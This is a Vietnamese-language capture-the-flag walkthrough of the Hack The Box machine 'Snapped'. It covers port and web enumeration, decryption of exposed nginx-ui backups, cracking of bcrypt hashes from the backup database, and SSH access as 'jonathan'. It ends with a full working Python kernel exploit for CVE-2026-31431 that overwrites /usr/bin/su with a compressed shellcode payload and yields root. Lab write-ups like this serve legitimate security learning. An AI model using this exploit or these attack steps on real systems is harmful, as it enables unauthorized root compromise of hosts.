---
coverY: 0
---

# Snapped

### Initial Access

Đầu tiên, chúng ta bắt đầu bằng việc quét các cổng dịch vụ đang mở trên máy mục tiêu bằng công cụ Nmap để xác định bề mặt tấn công.

```
 sudo nmap -sV -sC -T4 -vv -oN Snapped/output.txt 10.129.9.91

22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4b:c1:eb:48:87:4a:08:54:89:70:93:b7:c7:a9:ea:79 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJmeoJvLKYHBiXGWuhesZc1pKunLKcWr27Tf1iTu4Vrf+ZnI3aAEdfSNx1s+74ezW5xgxjkv9xbVUTpJ+fUyUhM=
|   256 46:da:a5:65:91:c9:08:99:b2:96:1d:46:0b:fc:df:63 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIA6U/NpGpmd9TrojW8J4VdQaMccQBJZTggUXe6u0YGor
80/tcp open  http    syn-ack ttl 63 nginx 1.24.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://snapped.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Kết quả:** Quét Nmap cho thấy hai cổng đang mở là 22 (SSH) và 80 (HTTP). Cổng 80 đang chạy Nginx và tự động chuyển hướng về tên miền `snapped.htb`. Chúng ta cần thêm tên miền này vào file `/etc/hosts` để có thể truy cập qua trình duyệt.

Tiếp theo, chúng ta sử dụng Rustscan để quét cổng một cách nhanh chóng hơn và xác nhận lại kết quả từ Nmap.

```
 ┌──(duong㉿duong)-[~]
└─$ rustscan -a 10.129.9.91 
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/duong/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.129.9.91:22
Open 10.129.9.91:80
[~] Starting Script(s)
[~] Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-04 04:45 -0400
Initiating Ping Scan at 04:45
Scanning 10.129.9.91 [4 ports]
Completed Ping Scan at 04:45, 0.07s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 04:45
Completed Parallel DNS resolution of 1 host. at 04:45, 0.50s elapsed
DNS resolution of 1 IPs took 0.50s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 04:45
Scanning 10.129.9.91 [2 ports]
Discovered open port 22/tcp on 10.129.9.91
Discovered open port 80/tcp on 10.129.9.91
Completed SYN Stealth Scan at 04:45, 0.07s elapsed (2 total ports)
Nmap scan report for 10.129.9.91
Host is up, received reset ttl 63 (0.054s latency).
Scanned at 2026-06-04 04:45:47 EDT for 0s

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.70 seconds
           Raw packets sent: 6 (240B) | Rcvd: 3 (128B)
```

**Kết quả:** Rustscan cũng xác nhận các cổng 22 và 80 đang mở. Bây giờ chúng ta sẽ chuyển sang thăm dò bề mặt web.

#### Web Scan

**Main website enumeration**

Sử dụng Feroxbuster để thực hiện brute-force các thư mục và file trên trang web chính `http://snapped.htb/`.

```
 ┌──(duong㉿duong)-[~]
└─$ feroxbuster -u http://snapped.htb/        
                                                                                                                                                                                         
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://snapped.htb/
 🚩  In-Scope Url          │ snapped.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        7l       12w      162c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      553l     1927w    17808c http://snapped.htb/style.css
200      GET      539l     1856w    20199c http://snapped.htb/
[####################] - 38s    30001/30001   0s      found:2       errors:1      
[####################] - 38s    30000/30000   799/s   http://snapped.htb/                                                                                                                                                                                           
```

**Kết quả:** Quét thư mục không mang lại nhiều thông tin thú vị. Chúng ta nên thử tìm kiếm các subdomain (tên miền phụ) có thể tồn tại.

**Subdomain discovery**

Sử dụng FFUF để tìm kiếm subdomain của `snapped.htb`.

```
 ┌──(duong㉿duong)-[~]
└─$ ffuf -u http://snapped.htb/ -H "Host: FUZZ.snapped.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fs 154

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://snapped.htb/
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.snapped.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 154
________________________________________________

admin                   [Status: 200, Size: 1407, Words: 164, Lines: 50, Duration: 54ms]
:: Progress: [19966/19966] :: Job [1/1] :: 740 req/sec :: Duration: [0:00:28] :: Errors: 0 ::
```

**Kết quả:** Công cụ FFUF đã tìm thấy một subdomain quan trọng là `admin.snapped.htb`. Chúng ta cần thêm subdomain này vào file `/etc/hosts` và bắt đầu thăm dò nó.

**Admin panel enumeration**

**Scan web admin**

Thực hiện quét thư mục trên subdomain `admin.snapped.htb` bằng Feroxbuster.

```
 ┌──(duong㉿duong)-[~]
└─$ feroxbuster -u http://admin.snapped.htb/  
                                                                                                                                                                                         
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://admin.snapped.htb/
 🚩  In-Scope Url          │ admin.snapped.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        1l        2w       23c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       63l      116w     1316c http://admin.snapped.htb/manifest.json
200      GET        9l       12w      243c http://admin.snapped.htb/browserconfig.xml
200      GET        6l       17w     1344c http://admin.snapped.htb/favicon-32x32.png
200      GET       30l      282w    11373c http://admin.snapped.htb/pwa-192x192.png
301      GET        0l        0w        0c http://admin.snapped.htb/assets => assets/
200      GET      106l      588w    50147c http://admin.snapped.htb/pwa-512x512.png
404      GET      212l      423w    12987c http://admin.snapped.htb/assets/
200      GET       64l      142w    75487c http://admin.snapped.htb/favicon.ico
200      GET        1l     8254w   308866c http://admin.snapped.htb/assets/index-Cjd4fVAL.css
403      GET        1l        2w       34c http://admin.snapped.htb/mcp
200      GET      624l    38187w  2050223c http://admin.snapped.htb/assets/index-DoHxQupa.js
200      GET       50l      104w     1407c http://admin.snapped.htb/
[####################] - 39s    60012/60012   0s      found:12      errors:0      
[####################] - 39s    30000/30000   773/s   http://admin.snapped.htb/ 
[####################] - 38s    30000/30000   781/s   http://admin.snapped.htb/assets/   
```

**Kết quả:** Quét Feroxbuster cho thấy một số file tài sản (assets) và một đường dẫn `/mcp` bị trả về mã lỗi 403 (Forbidden).

<figure><img src=".gitbook/assets/Screenshot 2026-06-04 at 16.47.43.png" alt=""><figcaption></figcaption></figure>

Kết qủa cho thấy web có thêm 1 endpoint đang chú ý là `/api`

Tiếp theo, chúng ta sử dụng Nuclei để quét các lỗ hổng bảo mật đã biết trên trang admin này.

**Vulnerability scanning**

```
 ┌──(duong㉿duong)-[~]
└─$ nuclei -u http://admin.snapped.htb/  

                     __     _
   ____  __  _______/ /__  (_)
  / __ \/ / / / ___/ / _ \/ /
 / / / / /_/ / /__/ /  __/ /
/_/ /_/\__,_/\___/_/\___/_/   v3.8.0

                projectdiscovery.io

[INF] Current nuclei version: v3.8.0 (outdated)
[INF] Current nuclei-templates version: v10.4.3 (latest)
[INF] New templates added in latest release: 2
[INF] Templates loaded for current scan: 10367
[INF] Executing 6718 signed templates from projectdiscovery/nuclei-templates
[WRN] Loading 3649 unsigned templates for scan. Use with caution.
[INF] Targets loaded for current scan: 1
[INF] Templates clustered: 2376 (Reduced 2244 Requests)
[INF] Using Interactsh Server: oast.online
[CVE-2026-33032] [http] [critical] http://admin.snapped.htb/mcp_message
[waf-detect:nginxgeneric] [http] [info] http://admin.snapped.htb/
[ssh-auth-methods] [javascript] [info] admin.snapped.htb:22 ["["publickey","password"]"]
[ssh-password-auth] [javascript] [info] admin.snapped.htb:22
[ssh-server-enumeration] [javascript] [info] admin.snapped.htb:22 ["SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.15"]
[ssh-sha1-hmac-algo] [javascript] [info] admin.snapped.htb:22
[openssh-detect] [tcp] [info] admin.snapped.htb:22 ["SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.15"]
[INF] Skipped admin.snapped.htb:80 from target list as found unresponsive permanently: cause="no address found for host" chain="got err while executing https://www.rdap.net/domain/admin.snapped.htb"
[nginx-version] [http] [info] http://admin.snapped.htb/ ["nginx/1.24.0"]
[browserconfig-xml] [http] [info] http://admin.snapped.htb/browserconfig.xml
[ikev2-transforms-enum:transforms] [javascript] [info] admin.snapped.htb:500 ["PROBE:AES-CBC-256:error:conn-error","PROBE:AES-CBC-128:error:conn-error","PROBE:3DES-CBC:error:conn-error","PROBE:CHACHA20-POLY1305:error:conn-error","PROBE:AES-GCM-16ICV-256:error:conn-error","PROBE:AES-GCM-16ICV-128:error:conn-error"]
[CVE-2026-27944:backup_security_header] [http] [critical] http://admin.snapped.htb/api/backup ["XTMMB8DP4ZaC4Jt5BW5XRZOjzwH0twlseiNj03iLDQs=:QPdWESVygQ7cD3bH/St5Eg=="]
[http-missing-security-headers:permissions-policy] [http] [info] http://admin.snapped.htb/
[http-missing-security-headers:x-content-type-options] [http] [info] http://admin.snapped.htb/
[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://admin.snapped.htb/
[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://admin.snapped.htb/
[http-missing-security-headers:x-frame-options] [http] [info] http://admin.snapped.htb/
[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://admin.snapped.htb/
[http-missing-security-headers:referrer-policy] [http] [info] http://admin.snapped.htb/
[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://admin.snapped.htb/
[http-missing-security-headers:strict-transport-security] [http] [info] http://admin.snapped.htb/
[http-missing-security-headers:content-security-policy] [http] [info] http://admin.snapped.htb/
[nginx-eol:version] [http] [info] http://admin.snapped.htb/ ["1.24.0"]
[INF] Skipped admin.snapped.htb:5814 from target list as found unresponsive permanently: Get "https://admin.snapped.htb:5814/autopass": cause="port closed or filtered" address=admin.snapped.htb:5814 chain="connection refused"
[robots-txt-endpoint] [http] [info] http://admin.snapped.htb/robots.txt
[tech-detect:nginx] [http] [info] http://admin.snapped.htb/
[caa-fingerprint] [dns] [info] admin.snapped.htb
[INF] Scan completed in 1m. 25 matches found.        
```

**Kết quả:** Nuclei đã phát hiện ra lỗ hổng cực kỳ nghiêm trọng: CVE-2026-33032 và CVE-2026-27944. Đặc biệt, đường dẫn `http://admin.snapped.htb/api/backup` có vẻ như cho phép truy cập trái phép vào các bản sao lưu.

Dựa trên lỗ hổng đã tìm thấy, chúng ta tiến hành khai thác để lấy các bản sao lưu cấu hình và dữ liệu từ máy chủ.

### Foothold

#### Backup extraction and decryption

Mình lấy Poc https://github.com/advisories/GHSA-g9w5-qffc-6762 để chạy script:

```
┌──(venv)─(duong㉿duong)-[~/Desktop]
└─$ python3 script.py --target http://admin.snapped.htb --decrypt

X-Backup-Security: M8wPwcQ/DdilUyqokLwQI92GFP8O140AGhKPc3wpLPE=:E05lV7YXZUxB1DMPmB8tnQ==
Parsed AES-256 key: M8wPwcQ/DdilUyqokLwQI92GFP8O140AGhKPc3wpLPE=
Parsed AES IV    : E05lV7YXZUxB1DMPmB8tnQ==

[*] Key length: 32 bytes (AES-256 ✓)
[*] IV length : 16 bytes (AES block size ✓)

[*] Extracting encrypted backup to backup_extracted
[*] Main archive contains: ['hash_info.txt', 'nginx-ui.zip', 'nginx.zip']
[*] Decrypting hash_info.txt...
    → Saved to backup_extracted/hash_info.txt.decrypted (199 bytes)
[*] Decrypting nginx-ui.zip...
    → Saved to backup_extracted/nginx-ui_decrypted.zip (7688 bytes)
    → Extracted 2 files to backup_extracted/nginx-ui
[*] Decrypting nginx.zip...
    → Saved to backup_extracted/nginx_decrypted.zip (9936 bytes)
    → Extracted 22 files to backup_extracted/nginx

[*] Hash info:
nginx-ui_hash: 76fc21175b60add983404e2aef76b79a352c29f272242bb6784f7ed5647f9b02
nginx_hash: c0547babf1f53cb29303ae7043a9f83a948ed87c9cbb7f4a7a523ffc44a58aeb
timestamp: 20260604-050656
version: 2.3.2
```

**Kết quả:** Script đã giải mã thành công bản sao lưu và trích xuất các file quan trọng. Trong đó có file `database.db` của Nginx UI.

### Privilege Escalation

#### Extracting and decrypting backups

#### Extracting credentials from the database

Chúng ta sẽ sử dụng `sqlite3` để kiểm tra nội dung của cơ sở dữ liệu này nhằm tìm kiếm thông tin đăng nhập.

```
┌──(venv)─(duong㉿duong)-[~/Desktop/backup_extracted/nginx-ui]
└─$ sqlite3 database.db
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> .tables
acme_users         configs            namespaces         sites            
auth_tokens        dns_credentials    nginx_log_indices  streams          
auto_backups       dns_domains        nodes              upstream_configs 
ban_ips            external_notifies  notifications      users            
certs              llm_sessions       passkeys         
config_backups     migrations         site_configs     
sqlite> .headers on
sqlite> .mode column
sqlite> SELECT id,name,password,status,language FROM users;
id  name      password                                                      status  language
--  --------  ------------------------------------------------------------  ------  --------
1   admin     $2a$10$8YdBq4e.WeQn8gv9E0ehh.quy8D/4mXHHY4ALLMAzgFPTrIVltEvm  1       en      
2   jonathan  $2a$10$8M7JZSRLKdtJpx9YRUNTmODN.pKoBsoGCBi5Z8/WVGO2od9oCSyWq  1       en   
```

**Kết quả:** Tìm thấy hash mật khẩu của hai người dùng: `admin` và `jonathan`. Chúng ta sẽ lưu các hash này vào một file để thực hiện tấn công brute-force.

#### Cracking password hashes

Luu vao file hash de bruteforce password bang john

```

┌──(duong㉿duong)-[~/Desktop]
└─$ vim hash.txt

┌──(duong㉿duong)-[~/Desktop]
└─$ cat hash.txt 
admin:$2a$10$8YdBq4e.WeQn8gv9E0ehh.quy8D/4mXHHY4ALLMAzgFPTrIVltEvm
jonathan:$2a$10$8M7JZSRLKdtJpx9YRUNTmODN.pKoBsoGCBi5Z8/WVGO2od9oCSyWq
```

Sử dụng John the Ripper cùng với wordlist `rockyou.txt` để bẻ khóa hash mật khẩu.

```
┌──(duong㉿duong)-[~/Desktop]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (bcrypt [Blowfish 32/64 X2])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
linkinpark       (jonathan)     
```

**Kết quả:** Đã bẻ khóa thành công mật khẩu của `jonathan` là `linkinpark`. Bây giờ chúng ta có thể sử dụng thông tin này để đăng nhập qua SSH.

#### SSH access as jonathan

Tiến hành đăng nhập SSH vào máy chủ bằng tài khoản `jonathan`.

```
┌──(duong㉿duong)-[~]
└─$ ssh jonathan@10.129.9.91
The authenticity of host '10.129.9.91 (10.129.9.91)' can't be established.
ED25519 key fingerprint is: SHA256:n0XlQQqHGczclhalpCeoOZDYQGr7rl3WlJytHLWPkr8
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.9.91' (ED25519) to the list of known hosts.
jonathan@10.129.9.91's password: 
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.17.0-19-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

Expanded Security Maintenance for Applications is not enabled.

1 update can be applied immediately.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Last login: Fri Mar 20 12:27:50 2026 from 10.10.14.5
jonathan@snapped:~$ ls
Desktop  Documents  Downloads  Music  Pictures  Public  snap  Templates  user.txt  Videos
jonathan@snapped:~$ cat user.txt 
95e52d9bb08bf94eabfbabe77c4d7202
jonathan@snapped:~$ id
uid=1000(jonathan) gid=1000(jonathan) groups=1000(jonathan)
jonathan@snapped:~$ 
```

**Kết quả:** Đăng nhập thành công và lấy được file `user.txt`. Tiếp theo, chúng ta sẽ tìm cách leo thang đặc quyền lên root.

#### Kernel enumeration

Kiểm tra thông tin hệ thống và các module kernel để tìm kiếm các lỗ hổng leo thang đặc quyền.

```
jonathan@snapped:~$ modinfo algif_aead
filename:       /lib/modules/6.17.0-19-generic/kernel/crypto/algif_aead.ko.zst
description:    AEAD kernel crypto API user space interface
author:         Stephan Mueller <smueller@chronox.de>
license:        GPL
srcversion:     3DF2E3807A9E57F51D892B9
depends:        af_alg
intree:         Y
name:           algif_aead
retpoline:      Y
vermagic:       6.17.0-19-generic SMP preempt mod_unload modversions 
sig_id:         PKCS#7
signer:         Build time autogenerated kernel key
sig_key:        16:05:49:1C:C7:B1:9E:30:CA:07:06:DD:8C:6A:29:46:EF:F1:37:D0
sig_hashalgo:   sha512
signature:      14:19:B4:C6:28:A7:E5:5E:8B:A5:68:71:CB:CF:FF:6B:84:57:5E:76:
                92:DA:E6:E6:D6:F5:A9:62:C3:84:81:E7:94:F4:6E:CD:DD:DA:67:89:
                B6:91:05:1A:ED:4A:04:DA:B5:E1:F9:E0:09:4A:2B:BC:AF:3E:A6:60:
                C2:DA:B6:9B:02:99:26:97:84:B0:3E:AB:53:DC:F6:FA:60:3E:84:7F:
                A7:4B:2B:DF:C4:A4:E6:81:AA:02:81:09:D2:41:2F:4E:3E:6E:69:85:
                0F:3A:24:D8:2D:CF:62:66:50:B6:A3:23:80:15:E9:9F:A4:AF:49:E2:
                EA:FE:B2:3E:AB:66:4A:AE:89:15:12:72:74:29:6A:D1:4F:85:2D:E6:
                27:2E:58:B9:A3:B6:43:39:66:FE:D6:0E:62:5C:CF:DF:94:98:E2:8D:
                C5:6A:AC:9D:CC:5F:A8:31:1C:FB:56:50:D4:DF:1E:12:8E:A5:E2:C4:
                92:7E:1F:19:AD:CC:E2:2B:A4:9F:B5:69:46:C7:4D:96:29:84:00:E3:
                FD:4B:49:A4:E6:F6:17:78:D1:24:CB:05:B1:95:E6:4C:13:D2:E0:C5:
                C0:85:FF:8D:45:0F:B1:C8:D8:39:BA:98:D6:92:54:57:0E:12:0B:58:
                5B:37:7F:98:7D:CF:85:EF:82:DC:B4:37:64:18:01:4E:35:95:E0:4A:
                3F:59:8E:BA:8A:97:8A:D7:F4:8D:D1:84:4E:DB:BF:E4:18:2F:9E:7E:
                B5:E3:6A:FB:BA:5F:61:85:68:CF:11:2C:12:2F:C7:A9:68:B5:49:11:
                46:D3:63:2C:40:39:77:C3:9A:37:77:C6:AF:D0:1D:2B:27:F3:C5:FE:
                7C:88:3A:D1:1D:72:D7:EE:54:35:1D:3C:2F:06:15:A9:07:46:95:29:
                F1:80:0C:8C:DD:55:0D:5B:4B:EB:4F:97:34:4B:DF:8D:24:C4:05:84:
                73:8F:E8:85:E6:7E:4C:0D:AC:EE:CB:B7:9B:60:19:90:74:19:DA:BB:
                1C:7E:17:F5:28:C1:33:82:E7:25:AF:9C:B5:32:81:16:E7:65:58:57:
                06:23:5C:45:EE:74:78:C7:FC:37:B5:E7:5E:15:30:EB:8C:5C:9B:13:
                16:C6:D5:C0:06:D3:37:AB:81:84:88:73:A8:EC:C2:77:BB:13:68:69:
                83:84:56:F2:0D:E1:1E:26:8D:91:AE:95:05:77:B6:4F:CE:0E:36:24:
                C0:AE:CE:B8:AB:94:8E:37:AB:68:E0:47:80:F4:7D:91:B7:34:88:1D:
                82:0F:2B:31:8E:4A:D7:20:11:F6:30:BE:6E:BA:9E:EB:72:5C:C3:04:
                D2:3A:78:DE:3F:59:21:64:7A:A6:71:D6
jonathan@snapped:~$ lsmod | grep algif_aead
jonathan@snapped:~$ dpkg -l | grep -E 'linux-image|linux-modules|kmod' | grep -E '6.17|kmod'
ii  kmod                                          31+20240202-2ubuntu7.1                   amd64        tools for managing Linux kernel modules
ii  libkmod2:amd64                                31+20240202-2ubuntu7.1                   amd64        libkmod shared library
ii  linux-image-6.17.0-19-generic                 6.17.0-19.19~24.04.2                     amd64        Signed kernel image generic
ii  linux-image-generic-hwe-24.04                 6.17.0-19.19~24.04.2                     amd64        Generic Linux kernel image
ii  linux-modules-6.17.0-19-generic               6.17.0-19.19~24.04.2                     amd64        Linux kernel extra modules for version 6.17.0
ii  linux-modules-extra-6.17.0-19-generic         6.17.0-19.19~24.04.2                     amd64        Linux kernel extra modules for version 6.17.0
```

**Kết quả:** Hệ thống đang chạy phiên bản kernel Linux 6.17, phiên bản này có lỗ hổng CVE-2026-31431 liên quan đến module `algif_aead` cho phép leo thang đặc quyền.

#### Exploiting CVE-2026-31431

Chúng ta sử dụng một script Python để khai thác lỗ hổng này nhằm ghi đè các tiến trình nhạy cảm và lấy quyền root.

Script de exploit vi kernel Linux nam trong nhung ban bi CVE-2026-31431

```
#!/usr/bin/env python3

import os
import zlib
import socket

def hex_to_bytes(hex_string):
    return bytes.fromhex(hex_string)


def write_chunk(fd, offset, chunk):
    sock = socket.socket(38, 5, 0)
    sock.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))

    SOL_ALG = 279
    setsockopt = sock.setsockopt

    setsockopt(SOL_ALG, 1, hex_to_bytes("0800010000000010" + "0" * 64))
    setsockopt(SOL_ALG, 5, None, 4)

    conn, _ = sock.accept()

    size = offset + 4
    null_byte = hex_to_bytes("00")

    conn.sendmsg(
        [b"A" * 4 + chunk],
        [
            (SOL_ALG, 3, null_byte * 4),
            (SOL_ALG, 2, b"\x10" + null_byte * 19),
            (SOL_ALG, 4, b"\x08" + null_byte * 3),
        ],
        32768,
    )

    read_pipe, write_pipe = os.pipe()

    os.splice(fd, write_pipe, size, offset_src=0)
    os.splice(read_pipe, conn.fileno(), size)

    try:
        conn.recv(8 + offset)
    except Exception:
        pass

target = os.open("/usr/bin/su", os.O_RDONLY)

payload = zlib.decompress(
    hex_to_bytes(
        "78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"
    )
)

offset = 0
while offset < len(payload):
    write_chunk(target, offset, payload[offset:offset + 4])
    offset += 4

os.system("su")	
```

Tiến hành tạo file exploit trên máy mục tiêu và thực thi.

```
jonathan@snapped:~$ nano exploit.py
jonathan@snapped:~$ python3 exploit.py 
# id
uid=0(root) gid=1000(jonathan) groups=1000(jonathan)
```
